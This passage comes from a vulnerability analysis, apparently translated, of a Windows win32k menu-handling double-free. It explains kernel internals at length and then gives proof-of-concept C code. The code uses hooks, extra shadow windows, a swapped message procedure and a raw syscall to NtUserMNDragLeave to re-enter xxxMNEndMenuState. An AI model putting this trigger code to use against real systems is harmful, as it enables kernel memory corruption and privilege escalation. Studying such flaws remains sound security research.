corresponding popup menu object.

As the extra object of menu window object, popup menu object  tagPOPUPME

NU  is used to describe the popup state for the menu it represents, and to

associates objects such as the menu window object, the menu object, the

menu window objects of sub menu or parent menu.

When a menu is being popped up on the screen, a menu window object

and the related popup menu object are created; when the menu is selected

or canceled, the menu would no longer need to be displayed on the screen,

the system will destroy the menu window object and the popup menu object

at the appropriate time.

Popup Menu

Kernel function  xxxTrackPopupMenuEx  is responsible for menu pop-up and

tracking the selection of items. During the execution of this function, system

calls  xxxCreateWindowEx  function to create window object classed  #32768

( MENUCLASS ) for the menu object to be displayed. Window object classed

MENUCLASS  is normally in form of  tagMENUWND  structure. This kind of

window object has a pointer size extra area, used to store the pointer to the
associated  tagPOPUPMENU  object.

pwndHierarchy = xxxCreateWindowEx(
    0x181,
    0x8000, // MENUCLASS
    0x8000, // MENUCLASS
    0,
    0x80800000,
    xLeft,
    yTop,
    100,
    100,
    (pMenu->fFlags & 0x40000000) != 0 ? pwndOwner : 0, // MNS_MODELESS
    0,
    pwndOwner->hModule,
    0,
    0x601u,
    0);

Function xxxTrackPopupMenuEx creates MENUCLASS window object

After allocating window object, function  xxxCreateWindowEx  sends  WM_NCC
REATE  message to this object,a and calls the message procedure specified

by the window object. The message procedure of  MENUCLASS  classed

window object is  xxxMenuWindowProc  kernel function. When handling  WM_N

CCREATE  message, the function creates and initializes the popup menu

information structure  tagPOPUPMENU  object associated with the window
object, then sets field  tagPOPUPMENU->spwndPopupMenu  as the address of

the menu window  tagMENUWND  object, and sets the extra area at the end of

the window object as the address of the popup menu  tagPOPUPMENU

object.

The relation between tagMENUWND and tagPOPUPMENU

When sending messages such as  WM_NCCREATE  to the target window
object through  xxxSendMessageTimeout  function, before calling the object-

specified message procedure, the system also calls  xxxCallHook  function

to invoke  WH_CALLWNDPROC  classed hook procedures which previously set

by the user process. This type of hook procedure is invoked before the

system sending messages to the target window object.

if ( (LOBYTE(gptiCurrent->fsHooks) | LOBYTE(gptiCurrent->pDeskInfo->fsHooks)) & 0
{
  v22 = pwnd->head.h;
  v20 = wParam;
  v19 = lParam;
  v21 = message;
  v23 = 0;
  xxxCallHook(0, 0, &v19, 4); // WH_CALLWNDPROC
}

Function xxxSendMessageTimeout calls xxxCallHook

Then function  xxxTrackPopupMenuEx  calls  xxxMNAllocMenuState  to
initialize various fields of the menu state structure. The previously created

popup menu object is used as the current root popup menu object, and its

address is stored in field  pGlobalPopupMenu  of the menu state structure.

menuState = xxxMNAllocMenuState(ptiCurrent, ptiNotify, popupMenu);

Function xxxTrackPopupMenuEx initializes menu state structure

Then the function calls  xxxSetWindowPos  to set the position of the target

menu window and display it on the screen. During the execution of function

xxxSetWindowPos , after the window position and state being set, system

calls  xxxSendChangedMsgs  in function  xxxEndDeferWindowPosEx  to send
the message that the window position has changed.

  xxxSetWindowPos(
    pwndHierarchy,
    (((*((_WORD *)menuState + 2) >> 8) & 1) != 0) - 1,
    xLParam,
    yLParam,
    0,
    0,
    ~(0x10 * (*((_WORD *)menuState + 2) >> 8)) & 0x10 | 0x241);

Function xxxTrackPopupMenuEx displays root menu window object

In function  xxxSendChangedMsgs , according to the set  SWP_SHOWWINDOW
state flag, system creates and adds associated shadow window object for

the current target menu window object. The relation between the two

window objects is added into  gpshadowFirst  shadow window associating

table in function  xxxAddShadow .

After returning from function  xxxSetWindowPos , function  xxxTrackPopupMe

nuEx  calls  xxxWindowEvent  function to send  EVENT_SYSTEM_MENUPOPUPSTA

RT  event notification, which represents that the popup menu has been

displayed.

xxxWindowEvent(6u, pwndHierarchy, 0xFFFFFFFC, 0, 0);

Function xxxTrackPopupMenuEx sends MENUPOPUPSTART event

If some window event procedures are set previously in the user process,

the system would dispatch these procedures during the thread message

loop processing.

Then if the menu type is modal, the thread will enter the menu message

loop waiting state, and will return directly if not.

To sum up in a picture:

Main execution flow of function xxxTrackPopupMenuEx

bServerSideWindowProc

The member flag bit  bServerSideWindowProc  of window structure  tagWND
object is a special flag bit, which determines whether the associated

message procedure of the window object belongs to server side or client

side. When going to call the message procedure of the target window object

to dispatch messages, function  xxxSendMessageTimeout  judges if this flag

bit is set.

  if ( *((_BYTE *)&pwnd->1 + 2) & 4 ) // bServerSideWindowProc
  {
    IoGetStackLimits(&uTimeout, &fuFlags);
    if ( &fuFlags - uTimeout < 0x1000 )
      return 0;
    lRet = pwnd->lpfnWndProc(pwnd, message, wParam, lParam);
    if ( !lpdwResult )
      return lRet;
    *(_DWORD *)lpdwResult = lRet;
  }

  else
  {
    xxxSendMessageToClient(pwnd, message, wParam, lParam, 0, 0, &fuFlags);
    [...]
  }

The logic of function xxxSendMessageTimeout calling message procedure

If the flag bit is set, the function would invoke the target window message

procedure in the kernel context directly; otherwise, the function sends the

message to the client side for processing by calling function  xxxSendMessag

eToClient , the target window message procedure would be always called

and executed in user context.

Special window objects such as menu window object have specialized

kernel-mode message procedures, therefore the member flag bit  bServerS

ideWindowProc  of these window objects would be set during the creation of

them. While common window objects just point to the default or user-

defined message procedures, the flag bit would not be set.

If there are some methods to set the unset flag bit  bServerSideWindowProc
 of a window object, the message procedure pointed to by the target

window object would also be executed in the kernel context directly.

Shadow Window

In  win32k  kernel module of Windows XP and higher version Windows, the
system creates and associates corresponding  SysShadow  classed shadow

window object for every window object with  CS_DROPSHADOW  flag, in order to

render the shadow effect of the original window. There is a global table  win
32k!gpshadowFirst  used to store all the relations between shadow window

object and original window object. Function  xxxAddShadow  is used to
create shadow window object for specific window object, and to add the

relation between them into  gpshadowFirst  global table.

Global table  gpshadowFirst  stores the relations of shadow windows in

form of a linked list. Every node of the linked list stores three pointer size

fields, respectively storing the object pointer of the original window and the
shadow window, as well as the pointer to the next linked list node. Every

newly added relation node will always be in the first node location of the

linked list, whose address will be stored in  gpshadowFirst  global variable.

Global variabe gpshadowFirst points to shadow window table

Correspondingly, when the shadow window is no longer needed, the

system calls  xxxRemoveShadow  to remove the relation node of the specified

window object and destroy the shadow window object. The function finds

the first matched node according to the original window object from

parameters, then removes the node from the list and frees the node buffer,

and destroys the shadow window object.

Submenu

If there is at least a submenu item in the menu currently displayed on the

screen, when user selects it by clicking the mouse button, the system sends
a  WM_LBUTTONDOWN  message which represents that the left mouse button is
being pressed to the menu window object of the menu containing the item.

If the menu type is modeless ( MODELESS ), kernel function  xxxMenuWindowP

roc  receives this message and delivers to  xxxCallHandleMenuMessages

function.

Function  xxxCallHandleMenuMessages  is responsible for processing

messages for modeless menu just like in the modal case. In the function,
system calculates the actual coordinates where the mouse button is

pressed according to the relative coordinates stored in the incoming

parameter  lParam  and the absolute coordinates of the current window on
the screen, and downward calls  xxxHandleMenuMessages  function.

The function passes the actual coordinate point to function  xxxMNFindWindo

wFromPoint  to find the window where the coordinate point is located on the

screen, then sets field  uButtonDownHitArea  of the menu state structure as
the pointer to the found window object. If the value is really a window

object, the function would send an  MN_BUTTONDOWN  message to it.

Then the execution flow enters function  xxxMenuWindowProc  and calls

function  xxxMNButtonDown  to handle  MN_BUTTONDOWN  message.

case 0x1EDu:
  if ( wParam < pmenu->cItems || wParam >= 0xFFFFFFFC )
    xxxMNButtonDown(popupMenu, menuState, wParam, 1);
  return 0;

Function xxxMenuWindowProc calls xxxMNButtonDown

Function  xxxMNButtonDown  calls  xxxMNSelectItem  function to select
menu item according to the area where the mouse button is pressed and

stores it into field  posSelectedItem  of current popup menu object. Then

the function calls function  xxxMNOpenHierarchy  to open the new popup
hierarchy menu.

During the execution of function  xxxMNOpenHierarchy , system calls

function  xxxCreateWindowEx  to create new  MENUCLASS  classed submenu

window object, and to insert the popup menu structure  tagPOPUPMENU

created for the new submenu window object into the delayed free list of

popup menu object.

The function sets filed  spwndNextPopup  of the popup menu structure  tagP

OPUPMENU  object associated with the current menu window object as the

pointer to the newly allocated submenu window object, and sets field  spwnd

PrevPopup  of the popup menu structure  tagPOPUPMENU  object associated

with the newly allocated menu window object as the pointer to the current

submenu window object, to make the newly created popup menu object the

submenu of the current menu object.

Relation between current and newly created tagMENUWND object

The function sets flag bit  fHierarchyDropped  of the flags field of current
popup menu structure  tagPOPUPMENU  object, which means that the menu

object has a popped up submenu.

Then the function calls  xxxSetWindowPos  to sets the position of the new

menu window object and display it on the screen, and sends  EVENT_SYSTEM

_MENUPOPUPSTART  event notification by calling function  xxxWindowEvent .

The corresponding shadow window object of the new menu window object

is created and associated with the menu window object during the
execution of  xxxSetWindowPos  function.

The summary execution flow is as below:

Summary execution of opening hierarchy

End Menu

There are multiple paths to reach function  xxxMNEndMenuState  in user
processes, for example, by sending  MN_ENDMENU  message to a target

menu window object, or calling  NtUserMNDragLeave  system service, etc.

When someone are sending  MN_ENDMENU  message to a target menu

window object, the system calls function  xxxEndMenuLoop  in menu window

message procedure  xxxMenuWindowProc  and passes the pointers to the

menu state structure object associated with current thread and to the root

popup menu object pointed to by field  pGlobalPopupMenu  of the menu

state object as parameters in order to make sure the whole menu objects

are ended or canceled. If the menu type is modeless, the function then calls
function  xxxMNEndMenuState  in the current context to cleanup menu state

information and to free related objects.

  menuState = pwnd->head.pti->pMenuState;
  [...]
LABEL_227: // EndMenu
  xxxEndMenuLoop(menuState, menuState->pGlobalPopupMenu);
  if ( menuState->flags & 0x100 )
    xxxMNEndMenuState(1);
  return 0;

Function xxxMenuWindowProc processes MN_ENDMENU message

During the execution of function  xxxEndMenuLoop , the system calls  xxxMND

ismiss , in which finally function  xxxMNCancel  would be called, to perform

the operation of the menu cancellation.

int __stdcall xxxMNDismiss(tagMENUSTATE *menuState)
{
  return xxxMNCancel(menuState, 0, 0, 0);
}

Function xxxMNDismiss calls xxxMNCancel

Function  xxxMNCancel  calls  xxxMNCloseHierarchy  function to close the
hierarchy state of the current popup menu object.

popupMenu = pMenuState->pGlobalPopupMenu;
[...]
xxxMNCloseHierarchy(popupMenu, pMenuState);

Function xxxMNCancel calls xxxMNCloseHierarchy

Function  xxxMNCloseHierarchy  judges if filed  fHierarchyDropped  of the

popup menu  tagPOPUPMENU  object from parameters has been set. If not, it
means there is no popped up submenu from the current popup menu, then

the system returns from this function.

Then function  xxxMNCloseHierarchy  retrieves the pointer stored in field  s

pwndNextPopup  of the current popup menu object, which points to the

window object of the submenu that pops up from the current popup menu

object. The function sends  MN_CLOSEHIERARCHY  message to the submenu

window object by calling  xxxSendMessage  function. Finally function  xxxMen

uWindowProc  receives this message and calls  xxxMNCloseHierarchy  for

the popup menu object associated with the target window object to handle

the task of closing the hierarchy state of the submenu object.

  popupMenu = *(tagPOPUPMENU **)((_BYTE *)pwnd + 0xb0);
  menuState = pwnd->head.pti->pMenuState;
  [...]
case 0x1E4u:
  xxxMNCloseHierarchy(popupMenu, menuState);
  return 0;

Function xxxMenuWindowProc processes MN_CLOSEHIERARCHY

message

After returning from function  xxxSendMessage , function  xxxMNCloseHierar
chy  calls  xxxDestroyWindow  to attempt to destroy the window object of

the popup submenu window object, which should be noted that this is an

attempt to destroy the window object of the popup submenu, rather than the

window object of the current menu.

During the execution of function  xxxDestroyWindow , the system calls
function  xxxSetWindowPos  to hide the target menu window object from the

screen.

dwFlags = 0x97;
if ( fAlreadyDestroyed )
  dwFlags = 0x2097;
xxxSetWindowPos(pwnd, 0, 0, 0, 0, 0, dwFlags);

Function xxxDestroyWindow hide target window object

At the end of the execution of function  xxxSetWindowPos , corresponding to
the case when creating the menu window object, the system calls function

xxxSendChangedMsgs  to send the message that the window position has

changed. In this function, according to the set  SWP_HIDEWINDOW  state flag,

by calling function  xxxRemoveShadow , the system finds and removes the

first relation node associated with the target menu window object from  gpsh

adowFirst  shadow window table and destroy the shadow window object.

Then the execution flow enters function  xxxFreeWindow  from  xxxDestroyW
indow  to perform the subsequent destruction operation on the target

window object.

The function calls corresponding message wrap procedure  xxxWrapMenuWi
ndowProc  and passes  WM_FINALDESTROY  message as parameter according

to the value of field  fnid  of target window object, and finally function  xxxM

enuWindowProc  receives this message and performs the task of cleaning up

releted data for the target popup menu object. In this function, field  fDestro

yed  of target popup menu object and field  fFlushDelayedFree  of root

popup menu object are set.

*(_DWORD *)popupMenu |= 0x8000u;
[...]

if ( *((_BYTE *)popupMenu + 2) & 1 )
{
  popupMenuRoot = popupMenu->ppopupmenuRoot;
  if ( popupMenuRoot )
    *(_DWORD *)popupMenuRoot |= 0x20000u;
}

Function xxxMNDestroyHandler set releted flag bits

Then function  xxxFreeWindow  calls function  xxxRemoveShadow  again for

the target window object to remove the relation with shadow window. If all

the related shadow windows of target window object have been removed
before, function  xxxRemoveShadow  cannot match any relation node from
relation table and return directly.

if ( pwnd->pcls->atomClassName == gatomShadow )
  CleanupShadow(pwnd);
else
  xxxRemoveShadow(pwnd);

Function xxxFreeWindow removes shadow window object again

The function returns to the superior caller after freeing and unlocking some

objects. At this point, as the lock count has not returned to zero, the target

window object still exists in the kernel and waits for subsequent operations.

After returning from function  xxxDestroyWindow , the execution flow goes
back to  xxxMNCloseHierarchy  function. The function unlocks the submenu

window object pointed to by field  spwndNextPopup  of the current popup

menu object and sets the field as zero, then assigns field  spwndActivePopu

p  of root popup menu object to the window object associated with current

popup menu object with assignment lock, to select the current window

object as the active popup menu window object, which causes the original
submenu window object locked in field  spwndActivePopup  to be unlocked
and its lock count to go down.

HMAssignmentLock(
  (_HEAD **)&popupMenu->ppopupmenuRoot->spwndActivePopup,
  (_HEAD *)popupMenu->spwndPopupMenu);

Function xxxMNCloseHierarchy actives current menu window object

The execution flow returns to function  xxxMNCancel  from function  xxxMNCl

oseHierarchy , then the system calls  xxxDestroyWindow  function to

attempt to destroy current menu window object according to field  fIsTrack

Popup  of current popup menu object. This field of popup menu structure is

only set when root menu window object is being created in function  xxxTra

ckPopupMenuEx  at the beginning.

After the execution flow going back to function  xxxMenuWindowProc , the

function calls  xxxMNEndMenuState  for modeless menu object to clean up

menu state information and free related objects.

Brief execution flow for menu selection or cancellation

Delayed Free List of Popup Menu Object

There is a field named  ppmDelayedFree  in popup menu structure  tagPOPU
PMENU , used to link all the popup menu objects which are tagged as

delayed-free state, so that all of them can be destroyed uniformly when the

popup state of menu being ended.

Field  pGlobalPopupMenu  of the menu state  tagMENUSTATE  object

associated with thread points to root popup menu object, whose field  ppmDe

layedFree  is as the entry of the delayed free list of popup menu object

pointing to the first node of the linked list. Field  ppmDelayedFree  of the

subsequent popup menu objects in the list would point to the next list node

object.

In function  xxxMNOpenHierarchy , system insert the popup menu structure

tagPOPUPMENU  object associated with the newly created submenu window

object into the delayed free list. The latest popup menu object is placed on

the first node of the list, and its address is stored into field  ppmDelayedFree
of root popup menu object, while the original address of popup menu object

in field  ppmDelayedFree  of root popup menu object is transferred to field  p

pmDelayedFree  of the newly added popup menu object.

Insert new popup menu object into delayed free list

xxxMNEndMenuState

During function  xxxMNEndMenuState  being executed, the system calls
function  MNFreePopup  to free root popup menu object pointed to by field  p

GlobalPopupMenu  of current menu state  tagMENUSTATE  object.

At the beginning, function  MNFreePopup  judges if the target popup menu

object is current root popup menu object from parameters or not. If so, the

function calls  MNFlushDestroyedPopups  to traverse and frees each popup

menu object in the delayed free list pointed to by field  ppmDelayedFree  of

root menu object.

Function  MNFlushDestroyedPopups  traverses each popup menu object in
the list, and calls  MNFreePopup  function for every object with flag bit  fDest

royed . Flag bit  fDestroyed  is set in function  xxxMNDestroyHandler  in the
first place.

ppmDestroyed = popupMenu;
for ( i = &popupMenu->ppmDelayedFree; *i; i = &ppmDestroyed->ppmDelayedFree )
{
  ppmFree = *i;
  if ( *(_DWORD *)*i & 0x8000 )
  {
    ppmFree = *i;
    *i = ppmFree->ppmDelayedFree;
    MNFreePopup(ppmFree);
  }
  [...]
}

Function MNFlushDestroyedPopups traverse delayed free list

After returning from function  MNFlushDestroyedPopups , function  MNFreePo

pup  calls  HMAssignmentUnlock  to unlock the assignment lock for each

window object fields such as  spwndPopupMenu .

In the kernel of Windows, theres is a member structure  HEAD  object at the

base location of every window object. This structure holds a copy of the

handle value ( h ) as well as a lock count ( cLockObj ), incremented

whenever an object is being used. When the object is no longer being used

by a particular component, its lock count is decremented. At the point where

the lock count reaches zero, the Window Manager knows that the object is

no longer being used by the system and frees it.

Function  HMAssignmentUnlock  is used to unlock references with
assignment lock that implemented for specific objects previously and

decrease the lock count. At the point where the lock count of target object

reaches zero, the system calls function  HMUnlockObjectInternal  to

destroy it.

bToFree = head->cLockObj == 1;
--head->cLockObj;
if ( bToFree )
  head = HMUnlockObjectInternal(head);
return head;

Function HMUnlockObject judges obnject that need to be destroyed

Function  HMUnlockObjectInternal  finds the handle table entry from the
handle table pointed to by field  aheList  of global shared information

structure  gSharedInfo  object according to the handle value of the target

object, and calls the object destroying routine indexed in global handle type

information array  gahti  in function  HMDestroyUnlockedObject  according

to the handle type stored in the handle table entry. If the target object to

destroy currently is a window object, the execution flow would enter kernel

function  xxxDestroyWindow .

At the end of function  MNFreePopup , as the unlocking and freeing of each

field have been completed, system calls function  ExFreePoolWithTag  to

free the target popup menu  tagPOPUPMENU  object.

It can be known by analyzing code that after freeing each field of menu

state structure by calling function  MNFreePopup , function  xxxMNEndMenuSta

te  would stores the value of field  pmnsPrev  of current menu state object

into field  pMenuState  of current thread information structure object, which

is  0  in normal conditions.

kd> ub
win32k!xxxMNEndMenuState+0x50:
93a96022 8b4620          mov     eax,dword ptr [esi+20h]
93a96025 898704010000    mov     dword ptr [edi+104h],eax
kd> r eax
eax=00000000

Function xxxMNEndMenuState resets pMenuState field

However, in the course of the the menu is being in pop-up state, it is field  p

MenuState  of thread information object that is used to retrieve menu state

by the system in each function or system service tracking popup menu.

Setting this field as other values would cases some noded in the path that

triggering vulnerability to fail and to return directly, which leads to the failure

of vulnerablity exploitation. Therefore, in order to make the thread execution
flow reach the statement again in function  xxxMNEndMenuState  where the

current  tagPOPUPMENU  object is to be freed to implement vulnerability
triggering, something must be done before the system resets field  pMe
nuState  of thread information object.

There are only two calling statements during the time between freeing root

popup menu object pointed to by field  pGlobalPopupMenu  and resetting

field  pMenuState  of thread information object:

UnlockMFMWFPWindow(&menuState->uButtonDownHitArea);
UnlockMFMWFPWindow(&menuState->uDraggingHitArea);

Field  uButtonDownHitArea  and  uDraggingHitArea  of menu state

structure store a pointer to the window object on which the coordinates

where the mouse button pressed is located and a pointer to the window

object on which the last coordinates where the mouse button pressed is

located when dragging mouse. The function unlock the assignment locks
for the two fields by calling  UnlockMFMWFPWindow  function.

Brief execution flow of function xxxMNEndMenuState

Focus on  uButtonDownHitArea  field, which stores the address of the

window object on which the coordinates where the mouse button pressed is

located, unlocked and set as zero once the mouse button is up. Therefore,

it is necessary to launch the operation to end menu during the system

processing the message that the mouse button is being pressed, so that

field  uButtonDownHitArea  would hold a legal address of window object

when the execution flow reaches the statement unlocking this field in

function  xxxMNEndMenuState .

During destroying the window object, system also destroys the associated

shadow window object. Since shadow window object doesn't have

specialized message procedure, the field pointing to the message

procedure of shadow window object can be modified to a user-defined

custom message procedure. In the custom message procedure, launching

the task of ending menu again may triggers vulnerablity successfully.

0x3 Triggering

In the next moment, we construct the proof of concept of this vulnerability,

in which the thread execution flow would reenter  xxxMNEndMenuState

function during the time between freeing root popup menu object and

resetting field  pMenuState  of current thread information object, in order to

trigger the double-free of the object pointed to by the target field  pGlobalPo

pupMenu .

Firstly create an independent thread for the proof code in the user process

to host the execution of the main task of proof code. Listen to whether

global variable  bDoneExploit  being assigned and wait the next operation
in the original thread.

Major Function of Proof Code

At first, proof code creates two modeless 'popupable' menu object. Since

modal menu would cause the thread to enter the loop waiting state in
function  xxxMNLoop  in the kernel, which is difficult to trigger the bug,
modeless menu type is selected. Here 'popupable' menu object is not an

aforementioned  tagPOPUPMENU  object, but a  tagMENU  object with  MFISPOP

UP  flag bit state. Structure  tagMENU  is the entity of menu, while  tagPOPUPM

ENU  object is used to describe popup state of menu object entity, created in

popping up a menu, destroyed in ending a menu.

Then add menu item for the two menu by  AppendMenuA , and make the
second one the submenu of the first one.

LPCSTR szMenuItem = "item";
MENUINFO mi = { 0 };
mi.cbSize  = sizeof(mi);
mi.fMask   = MIM_STYLE;
mi.dwStyle = MNS_AUTODISMISS | MNS_MODELESS | MNS_DRAGDROP;

hpopupMenu[0] = CreatePopupMenu();
hpopupMenu[1] = CreatePopupMenu();
SetMenuInfo(hpopupMenu[0], &mi);
SetMenuInfo(hpopupMenu[1], &mi);
AppendMenuA(hpopupMenu[0], MF_BYPOSITION | MF_POPUP, (UINT_PTR)hpopupMenu[1], szM
AppendMenuA(hpopupMenu[1], MF_BYPOSITION | MF_POPUP, 0, szMenuItem);

Proof code of creating and associating menus

Then create a common window object  hWindowMain  to be the owner

window object of the popup menu which will pop up subsequently. If the

target binary file is compiled as a GUI program, select the default window

object as the owner instead of creating extra one.

WNDCLASSEXW wndClass = { 0 };
wndClass = { 0 };
wndClass.cbSize = sizeof(WNDCLASSEXW);
wndClass.lpfnWndProc    = DefWindowProcW;
wndClass.cbWndExtra     = 0;
wndClass.hInstance      = GetModuleHandleA(NULL);
wndClass.lpszMenuName   = NULL;
wndClass.lpszClassName  = L"WNDCLASSMAIN";
RegisterClassExW(&wndClass);
hWindowMain = CreateWindowExW(WS_EX_LAYERED | WS_EX_TOOLWINDOW | WS_EX_TOPMOST,
    L"WNDCLASSMAIN",
    NULL,
    WS_VISIBLE,
    0,
    0,
    1,
    1,
    NULL,
    NULL,
    GetModuleHandleA(NULL),
    NULL);

Proof code of creating owner window object

Creates  WH_CALLWNDPROC  classed hook procedure associated with current

thread by calling  SetWindowsHookExW  function, and creates event
notification procedure including  EVENT_SYSTEM_MENUPOPUPSTART  event

associated with current process and current thread. As mentioned earlier,  W

H_CALLWNDPROC  classed hook procedure is invoked before the system

sending messages to the target window object. Event notification  EVENT_SY

STEM_MENUPOPUPSTART  represents that the target popup menu has been

displayed on the screen.

SetWindowsHookExW(WH_CALLWNDPROC, xxWindowHookProc,
    GetModuleHandleA(NULL),
    GetCurrentThreadId());
SetWinEventHook(EVENT_SYSTEM_MENUPOPUPSTART, EVENT_SYSTEM_MENUPOPUPSTART,

    GetModuleHandleA(NULL),
    xxWindowEventProc,
    GetCurrentProcessId(),
    GetCurrentThreadId(),
    0);

Proof code of creating hook procedure and event notification procedure

Proof code calls function  TrackPopupMenuEx  to make the first menu the

root menu and pop up it on the screen.

TrackPopupMenuEx(hpopupMenu[0], 0, 0, 0, hWindowMain, NULL);

Proof code of calling function TrackPopupMenuEx

Then realize message loop by calling functions such as  GetMessage  and  D
ispatchMessage  in current thread.

MSG msg = { 0 };
while (GetMessageW(&msg, NULL, 0, 0))
{
    TranslateMessage(&msg);
    DispatchMessageW(&msg);
}

Proof code of message loop

Proof code calss function  TrackPopupMenuEx  in the user process to make

the execution flow enter  xxxTrackPopupMenuEx  function in the kernel.

Execution logic of major function of proof code

Custom Hook Procedure

During the execution of function  TrackPopupMenuEx , system calls function

xxxCreateWindowEx  to create new menu classed window object. As

mentioned in previous section, when the window object is created

successfully, the function sends  WM_NCCREATE  message to the window
object. Before calling the object-specified message procedure, function  xxx

SendMessageTimeout  also calls  xxxCallHook  function to invoke  WH_CALLW

NDPROC  classed hook procedures defined by user processes previously. At

this point the execution flow calls back to the hook procedure defined

previously by us in the proof code.

In the custom hook procedure  xxWindowHookProc , we judge whether the

currently handled message is  WM_NCCREATE  message according to field  me

ssage  of the  tagCWPSTRUCT  object pointed to by parameter  lParam . If so,

we retrieve the class name of the window object by the window handle. It

means that it is the created menu window object when the class name is  #
32768 , we just record the handle value for subsequent references.

LRESULT CALLBACK
xxWindowHookProc(INT code, WPARAM wParam, LPARAM lParam)
{
    tagCWPSTRUCT *cwp = (tagCWPSTRUCT *)lParam;
    static HWND hwndMenuHit = 0;
    if (cwp->message != WM_NCCREATE)
    {
        return CallNextHookEx(0, code, wParam, lParam);
    }
    WCHAR szTemp[0x20] = { 0 };
    GetClassNameW(cwp->hwnd, szTemp, 0x14);
    if (!wcscmp(szTemp, L"#32768"))
    {
        hwndMenuHit = cwp->hwnd;
    }
    return CallNextHookEx(0, code, wParam, lParam);
}

Recording handle of #32768 window in hook procedure

When the target menu window object is created, system sets the location
coordinates of the window object in the kernel and displays it on the screen.

In the meantime, system creates  SysShadow  classed shadow window

object for the target window object. In the same way, system also calls  xxx

CallHook  function to dispatch hook procedures when creating shadow

window object and sending  WM_NCCREATE  message.

It is known in the analysis of part "End Menu" in previous section, during the

execution of function  xxxEndMenuLoop , system calls  xxxRemoveShadow

function twice for each popup menu window object, which would cause the

shadow window to be unassociated and destroyed in advance before it
reaches the vulnerability triggering location. Therefore, we should find a
way to create and associate with at least 3 shadow window objects for

the target menu window object.

Looking back to the custom hook procedure of the proof code, we add the
SysShadow  case into the judgement of window class name. If this case is

hit, we set  SWP_HIDEWINDOW  and  SWP_SHOWWINDOW  state flag successively

for the previously saved  #32768  classed window object, to make the
window hidden at first and then displayed, in order to trigger the logic of
associating with shadow window in the kernel once again to create a new

extra shadow window object.

It is during the shadow window being created in  xxxCreateWindowEx  in the
kernel when the execution flow enters the  SysShadow  processing logic in

the custom hook procedure. By this time, the association of created shadow

window object and the original window object has not been built yet, and

the relation between them has not been insert into  gpShadowFirst  list. It

would create and associate with multiple shadow window objects for the

target menu window object by calling  SetWindowPos  to set  SWP_SHOWWINDO

W  state flag for it at this time. Shadow window object created later will be

inserted into the list earlier to be located in the back of the list.

Logic of inserting multiple shadow windows association

In  SysShadow  processing logic of the custom hook procedure, we count the

time of entry, and call  SetWindowPos  to trigger the logic of creating new

shadow window association in the beginning twice, and modify the

message procedure field of the target shadow window object to a custom

shadow window message procedure defined by proof code in the last time.

if (!wcscmp(szTemp, L"SysShadow") && hwndMenuHit != NULL)
{
    if (++iShadowCount == 3)
    {
        SetWindowLongW(cwp->hwnd, GWL_WNDPROC, (LONG)xxShadowWindowProc);
    }
    else
    {
        SetWindowPos(hwndMenuHit, NULL, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP
        SetWindowPos(hwndMenuHit, NULL, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP
    }
}

Proof code of creating mutiple shadow windows

After everything is performed properly, it is necessary to set a global flag

variable to prevent the execution flow from repeatedly entering the custom

hook procedure so that the logic code above is executed multiple times.

Execution logic of creating mutiple shadow windows

Custom Event Notification Procedure

When finishing the creation of root popup menu object in kernel function  xx

xTrackPopupMenuEx , the system calls  xxxWindowEvent  to send  EVENT_SYS

TEM_MENUPOPUPSTART  event notification, which makes the execution flow

enter the custom event notification procedure  EVENT_SYSTEM_MENUPOPUPSTA
RT  defined by us previously. It means currently a new popup menu has

been dieplayed on the screen every time when the system enters this

procedure.

Counting in the custom event notification procedure of proof code, it means

that root popup menu has been displayed on the scren at the first time the

execution flow enters the procedure. So we call function  SendMessage  to

send  WM_LBUTTONDOWN  message to the menu window object pointed to by

parameter handle  hwnd  and set parameter  lParam  as the relative

coordinates where the left button is being pressed. In 32-bit system,

parameter  lParam  is a  DWORD  type integer number, whose high 16 bits
and low 16 bit indicate respectively the relative positions of the horizontal

and vertical coordinates. Parameter  wParam  determines which mouse

button has been being pressed, and being  1  means  MK_LBUTTON  left

mouse button.

Message procedure  xxxMenuWindowProc  receives and processes this

message in the kernel, which causes the execution flow to call function  xxx

MNOpenHierarchy  at last to create new popup menu related objects.

Similarly, After finishing the display of the new submenu on the screen,

function  xxxMNOpenHierarchy  calls function  xxxWindowEvent  to send  EVE

NT_SYSTEM_MENUPOPUPSTART  event notification, which make the execution

enter the custom event notification procedure  xxWindowEventProc
repeatly.

It means the submenu has been displayed on the screen at the second time
when the execution flow enters function  xxWindowEventProc . At this point
we call function  SendMessage  to send  MN_ENDMENU  message which means

ending the menu to the target submenu window object, which causes the

execution flow to enter kernel function  xxxMNEndMenuState  at the end.

VOID CALLBACK
xxWindowEventProc(
    HWINEVENTHOOK hWinEventHook,
    DWORD         event,
    HWND          hwnd,

    LONG          idObject,
    LONG          idChild,
    DWORD         idEventThread,
    DWORD         dwmsEventTime
)
{
    if (++iMenuCreated >= 2)
    {
        SendMessageW(hwnd, MN_ENDMENU, 0, 0);
    }
    else
    {
        SendMessageW(hwnd, WM_LBUTTONDOWN, 1, 0x00020002); // (2,2)
    }
}

Proof code of custom event notification procedure

When the execution flow enters function  xxxMNEndMenuState , field  uButto

nDownHitArea  of the menu state object associated with thread holds a

pointer to the window object on which the coordinates where the mouse

button pressed is located (the menu window object associated with 3

created shadow window objects previously). Since the first two shadow

window object associated with this menu window object in  gShadowFirst

list was unassociated and destroyed in function  xxxEndMenuLoop , at this

point the last shadow window node still exists in the list, whose message

procedure field was modified at that time.

After freeing current root popup menu object in  MNFreePopup , when the
function calls  UnlockMFMWFPWindow  to unlock the target menu window

object stored in field  uButtonDownHitArea , if everything goes well, the lock

count of this window object reaches zero then the menu manager would call

xxxDestroyWindow  function to perform the destroying task. At this point,

the third associated shadow window object would be unassociated and

destroyed and the execution flow would enter the custom shadow window

message procedure previously modified with.

Custom Shadow Window Message Procedure

In the custom shadow window message procedure  xxShadowWindowProc
of the proof code, we judge whether the message parameter is  WM_NCDESTR

OY  or not. If so, we call  NtUserMNDragLeave  system service here.

ULONG_PTR
xxSyscall(UINT num, ULONG_PTR param1, ULONG_PTR param2)
{
    __asm { mov eax, num };
    __asm { int 2eh };
}

CONST UINT num_NtUserMNDragLeave = 0x11EC;

LRESULT WINAPI
xxShadowWindowProc(
    _In_ HWND   hwnd,
    _In_ UINT   msg,
    _In_ WPARAM wParam,
    _In_ LPARAM lParam
)
{
    if (msg == WM_NCDESTROY)
    {
        xxSyscall(num_NtUserMNDragLeave, 0, 0);
    }
    return DefWindowProcW(hwnd, msg, wParam, lParam);
}

Proof code of custom shadow window message procedure

The function is commonly used to end the dragging state of menu. During

execution this function, after a series of judgements and calls, the system

